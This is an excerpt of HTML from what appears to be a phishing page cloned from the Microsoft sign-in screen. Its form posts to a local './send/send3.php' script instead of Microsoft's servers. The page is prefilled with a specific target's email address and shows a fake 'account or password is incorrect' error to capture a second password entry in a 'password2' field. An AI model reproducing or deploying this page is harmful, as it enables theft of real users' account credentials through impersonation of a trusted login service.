...
<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb remove-segoe-ui-symbol" style=display:block>
    ...
    <div>
        ...
        <form name=f1 id=i0281 spellcheck=false method=post target=_top autocomplete=off data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: !!activeDialog(), css: { 'provide-min-height': svr.fUseMinHeight }" action=./send/send3.php
    ...
    component: { name: 'background-image-control',
        ...
        event: { load: $page.backgroundImageControl_onLoad } }">
                        <div class=background-image-holder role=presentation data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                            ...
                            <div id=backgroundImage role=img data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }, ariaLabel: str['STR_Background_Image_AltText']" class="background-image ext-background-image" aria-label="Organization background image"
            ...
            css: {
                ...
                'has-header': $content.hasHeader }" class="sign-in-box ext-sign-in-box">
        ...
        'slide-in-back': animate.isSlideInBack() }">
                ...
                event: {
                    ...
                    setPendingRequest: $loginPage.view_onSetPendingRequest } }">
                                                                <div aria-hidden=true>
                                                                    ...
                                                                    <input type=text name=loginfmt data-bind="moveOffScreen, value: unsafe_displayName" class=moveOffScreen tabindex=-1 aria-hidden=true value=jpavlov@cgimg.com>
                  ...
                  childBindings: {
                      'idA_IL_ForgotPassword0': {
                          ...
                          click: accessRecoveryLink ? null : resetPassword_onClick } }" class="error ext-error">Your account or password is incorrect. If you don't remember your password, <a id=idA_IL_ForgotPassword0 href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAAjZI7jNsEGMfzuEvvIqDXghCPgQMhhKB2_I5zUqWeYye2c7FzifOwByxfYjt-O34mnhgZKxAPdWDoeAxFiKEwMaKbOrDQDYSEVIkKwdKxubKwILF8-v76_75v-f_rewSIYiAEQu9VERA6ehtrEjiG4WcAiswJAGudQQCJ6gQAL1ro1kKaxFyLrtcPQPyLDyZvfMp8fO-71-5--_jN8_I7yyQJ46NGI89z0LPmURAHRoISODgPvIar-QvLNzPkfrn8oFy-U9nVfWA8Oq_EBEqiZLOJEjBGwgiJQk1QoR28X8hrsXuaCDZXKG0IkiUZPZlyiGL3ExkRlmJ34ioSg_fpidO3uVwoBLtPjxOh4B1xywu2g51I5nrLJIrNrAWbXwpdJu_TwvJh5ap4nCZL5HIEkVXof1X2jSDy1DCIkzvVryrDeKLAjJOksLQqKNpNNpsTRcOlkHWO-SJauxYJZEVsDjMC84cqj-hmpGssIMbcAJFSUUfo9rrnc2fGZJBKooo5K9wJKRLBAWLkU8Vi4rbItQKpZDaIDWJqC0OAG_c0URmx2QyIYa7DnC46HWxaxN2k2P5A3ZhzhGYXK4D5hB-uuTz1IIAPC1npYWNatFc6NVOK3qoN6QJDHaPI8tQ3Fym33KxH0srt0oaKUTQxzmTWxAU1Wzh4J3ZWIxZAol4-myxpiqfsJqC6hjFrd3xo0cGTkZ7LkMsULpIVUARJohdHSzblxhNxk6RZ2hoH59VX_518YBjWXH-WeYZ8U61tFy_wL6rNINR9a3EYRoFhufrhf940xGeKDTwdPHbdX6vX7FDL3CC7NTctz7ykHuyUH-28vFc7eOuV0mHp3Zeg6tHeXv2gdKme7JTv7m4LGv-UhN7rn9_65Lef_67-_kfpYrdxEsmxNNcGyHC6gWm6n-uscGqZfJNvb-S0F2GNPN1kCxtuBzdbR_DtWvl2rXZR2-doVWAkQoX-rFU-ulL6fv9_Vv3hcy_W66mlusFcc_X4-j-V_-H50pMX7n35y2f3f_zwMfvo6g2lNVXeX8m9Bp_3C8hqneVjhBx2Bhm2mSV53xsWVMfhGW-qmTe_Pig9BQ2&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+10"
                                                                                    role=link>reset it now.</a></div>
            ...
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }">
                                                                            ...
                                                                            <input name=password2 type=password id=i0118 required class="form-control input ext-input text-box ext-text-box has-error ext-has-error" aria-required=true data-bind="
                ...
                externalCss: {
                    'input': true,
                    'text-box': true,
                    'has-error': passwordTextbox.error }" aria-describedby="loginHeader passwordError  " placeholder=Password aria-label="Enter the password for jpavlov@cgimg.com" tabindex=0 value>
                            ...
                            click: accessRecoveryLink ? null : resetPassword_onClick" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAAjZI7jNsEGMfzuEvvIqDXghCPgQMhhKB2_I5zUqWeYye2c7FzifOwByxfYjt-O34mnhgZKxAPdWDoeAxFiKEwMaKbOrDQDYSEVIkKwdKxubKwILF8-v76_75v-f_rewSIYiAEQu9VERA6ehtrEjiG4WcAiswJAGudQQCJ6gQAL1ro1kKaxFyLrtcPQPyLDyZvfMp8fO-71-5--_jN8_I7yyQJ46NGI89z0LPmURAHRoISODgPvIar-QvLNzPkfrn8oFy-U9nVfWA8Oq_EBEqiZLOJEjBGwgiJQk1QoR28X8hrsXuaCDZXKG0IkiUZPZlyiGL3ExkRlmJ34ioSg_fpidO3uVwoBLtPjxOh4B1xywu2g51I5nrLJIrNrAWbXwpdJu_TwvJh5ap4nCZL5HIEkVXof1X2jSDy1DCIkzvVryrDeKLAjJOksLQqKNpNNpsTRcOlkHWO-SJauxYJZEVsDjMC84cqj-hmpGssIMbcAJFSUUfo9rrnc2fGZJBKooo5K9wJKRLBAWLkU8Vi4rbItQKpZDaIDWJqC0OAG_c0URmx2QyIYa7DnC46HWxaxN2k2P5A3ZhzhGYXK4D5hB-uuTz1IIAPC1npYWNatFc6NVOK3qoN6QJDHaPI8tQ3Fym33KxH0srt0oaKUTQxzmTWxAU1Wzh4J3ZWIxZAol4-myxpiqfsJqC6hjFrd3xo0cGTkZ7LkMsULpIVUARJohdHSzblxhNxk6RZ2hoH59VX_518YBjWXH-WeYZ8U61tFy_wL6rNINR9a3EYRoFhufrhf940xGeKDTwdPHbdX6vX7FDL3CC7NTctz7ykHuyUH-28vFc7eOuV0mHp3Zeg6tHeXv2gdKme7JTv7m4LGv-UhN7rn9_65Lef_67-_kfpYrdxEsmxNNcGyHC6gWm6n-uscGqZfJNvb-S0F2GNPN1kCxtuBzdbR_DtWvl2rXZR2-doVWAkQoX-rFU-ulL6fv9_Vv3hcy_W66mlusFcc_X4-j-V_-H50pMX7n35y2f3f_zwMfvo6g2lNVXeX8m9Bp_3C8hqneVjhBx2Bhm2mSV53xsWVMfhGW-qmTe_Pig9BQ2&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+10"
                                                                                            role=link>Forgot my password</a>
